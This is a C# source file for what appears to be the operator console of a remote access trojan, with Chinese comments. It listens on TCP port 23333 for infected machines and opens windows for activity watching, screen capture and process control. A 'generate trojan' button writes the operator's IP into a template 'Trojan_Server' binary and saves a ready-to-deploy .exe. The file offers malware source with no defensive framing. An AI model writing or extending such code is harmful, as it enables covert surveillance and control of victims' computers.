using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.Net.Sockets;
using System.Net;
using System.Threading;
using System.IO;
using System.Resources;
using System.Reflection;

namespace Client
{
    public delegate void changecolor(bool ischange);
    public partial class Form1 : Form
    {
        Thread threadWatch = null;
        Socket socketWatch = null;
        Socket socConnect = null;

        public Form1()
        {
            InitializeComponent();
            TextBox.CheckForIllegalCrossThreadCalls = false;
        }

        /// <summary>
        /// 启动监听
        /// </summary>
        private void SocketStart()
        {
            socketWatch = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
            IPAddress ip= IPAddress.Parse("0.0.0.0");
            IPEndPoint endpoint = new IPEndPoint(ip, int.Parse("23333"));
            socketWatch.Bind(endpoint);
            socketWatch.Listen(20);
            threadWatch = new Thread(Watchconnect);
            threadWatch.IsBackground = true;
            threadWatch.Start();
        }

        /// <summary>
        /// 监听客户端的请求
        /// </summary>
        private void Watchconnect()
        {
            while (true)
            {
                socConnect = socketWatch.Accept();
                button1.BackColor = Color.Green;
                //ParameterizedThreadStart pts = new ParameterizedThreadStart(ServerMsg);
                //Thread thr = new Thread(pts);
                //thr.IsBackground = true;
                //thr.Start(socConnect);
            }
        }

        /// <summary>
        /// 发送方法
        /// </summary>
        /// <param name="sendMsg"></param>
        private void ServerSendMsg(string type,int mID,int res,string sendMsg)
        {
            int len = 11 + sendMsg.Length;
            byte[] sendBuffer = new byte[len];
            sendBuffer[0] = (byte)type [0];
            int i;
            for (i = 1; i <= 4; i++)
            {
                sendBuffer[i] = (byte)(mID >> 8 * (i - 1));
            }
            for (i = 5; i <= 8; i++)
            {
                sendBuffer[i] = (byte)(res >> (24 - 8 * (i-mID/10-2)));
            }
            for (i = 9; i < len - 2; i++)
            {
                sendBuffer[i] = (byte)sendMsg[i-9];
            }
            sendBuffer[len -2] = (byte)'\n';
            sendBuffer[len -1] = (byte)'\0';
            int r = socConnect.Send(sendBuffer);
            if (!socConnect.Connected)
            { }
        }

        /// <summary>
        /// 发送方法2
        /// </summary>
        /// <param name="type"></param>
        /// <param name="mID"></param>
        /// <param name="res"></param>
        /// <param name="sendMsg"></param>
        private void ServerSendMsg2(string type, int mID, int res, byte[] sendMsg)
        {
            int len = 11 + sendMsg.Length;
            byte[] sendBuffer = new byte[len];
            sendBuffer[0] = (byte)type[0];
            int i;
            for (i = 1; i <= 4; i++)
            {
                sendBuffer[i] = (byte)(mID >> 8 * (i - 1));
            }
            for (i = 5; i <= 8; i++)
            {
                sendBuffer[i] = (byte)(res >> (24 - 8 * (i - mID / 10 - 2)));
            }
            for (i = 9; i < len - 2; i++)
            {
                sendBuffer[i] = (byte)sendMsg[i - 9];
            }
            sendBuffer[len - 2] = (byte)'\n';
            sendBuffer[len - 1] = (byte)'\0';
            int r = socConnect.Send(sendBuffer);
            if (!socConnect.Connected)
            { }
        }

        /// <summary>
        /// 接收监听消息
        /// </summary>
        /// <param name="socketClientPara"></param>
        private void ServerMsg(object socketClientPara)
        {
            Socket socketServer = socketClientPara as Socket;
            while (true)
            {
                byte[] arrServerRecMsg = new byte[1024 * 1024];
                int length = socketServer.Receive(arrServerRecMsg);
                string strStrcMsg = Encoding.ASCII.GetString(arrServerRecMsg, 0, length);
                //txtMsg.AppendText("客户端" + GetCurrentTime() + "\r\n" + strStrcMsg + "\r\n");
            }
        }

        /// <summary>
        /// 开始监听
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void button1_Click(object sender, EventArgs e)
        {
            SocketStart();
            button1.BackColor = Color.Red;
        }

        /// <summary>
        /// 启动监听窗口
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void btnWatch_Click(object sender, EventArgs e)
        {
            int mID1 = GetRandomSequence0();
            FormWatch formwatch = new FormWatch(socConnect, mID1);
            formwatch.sendMsg1 += new SendMsg1(ServerSendMsg);
            formwatch.coloring += formwatch_coloring;
            ServerSendMsg("1", mID1, -1, "");
            formwatch.ShowDialog();

        }

        /// <summary>
        /// 启动抓屏窗口
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void button3_Click(object sender, EventArgs e)
        {
            int mID2 = GetRandomSequence0();
            FormPicture formpicture = new FormPicture(socConnect, mID2);
            formpicture.sendMsg2 += new SendMsg1(ServerSendMsg);
            formpicture.coloring += formpicture_coloring;
            ServerSendMsg("2", mID2, -1, "");
            formpicture.ShowDialog();
        }

        /// <summary>
        /// 启动进程窗口
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void button2_Click(object sender, EventArgs e)
        {
            int mID3 = GetRandomSequence0();
            FormPrograss formprograss = new FormPrograss(socConnect, mID3);
            formprograss.sendMsg3 += new SendMsg3(ServerSendMsg2);
            ServerSendMsg("3", mID3, -1, "");
            formprograss.ShowDialog();
        }

        /// <summary>
        /// 生成木马
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void button4_Click(object sender, EventArgs e)
        {

            FileStream fs = new FileStream(@".\\Trojan_Server", FileMode.Open, FileAccess.Read);
            int length = Convert.ToInt32(fs.Length);
            byte[] buffer = new byte[length];
            BinaryReader br = new BinaryReader(fs);
            br.Read(buffer, 0, length);
            string ip = textBox1.Text.Trim();
            int place = 0x120C74;
            for (int j = place; j < place + 15; j++)
            {
                buffer[j] = 0;
            }
            for (int k = 0; k < ip.Length; k++)
            {
                buffer[place + k] = (byte)ip[k];
            }
            SaveFileDialog saveFileDialog1 = new SaveFileDialog();
            saveFileDialog1.Filter = "木马程序(*.exe)|*.exe";
            saveFileDialog1.FilterIndex = 2;
            saveFileDialog1.RestoreDirectory = true;
            if (saveFileDialog1.ShowDialog() == DialogResult.OK)
            {
                string localFilePath = saveFileDialog1.FileName.ToString();
                System.IO.File.WriteAllBytes(localFilePath, buffer);
            }
        }

        /// <summary>
        /// 按钮变色
        /// </summary>
        /// <param name="ischange"></param>
        void formpicture_coloring(bool ischange)
        {
            this.button1 .BackColor = Color.Red;
        }
        
        /// <summary>
        /// 按钮变色
        /// </summary>
        /// <param name="ischange"></param>
        void formwatch_coloring(bool ischange)
        {
            this.button1.BackColor = Color.Red;
        }

        /// <summary>
        /// 获取随机数
        /// </summary>
        /// <returns></returns>
        public static int GetRandomSequence0()
        {
            int[] index = new int[100];
            for (int i = 0; i < 100; i++) index[i] = i + 6;
            Random r = new Random();
            int result;
            int site = 100;
            int id;
            id = r.Next(0, site - 1);
            result = index[id];
            return result;
            index[id] = index[site - 1];
            site--;
        }
    }
}
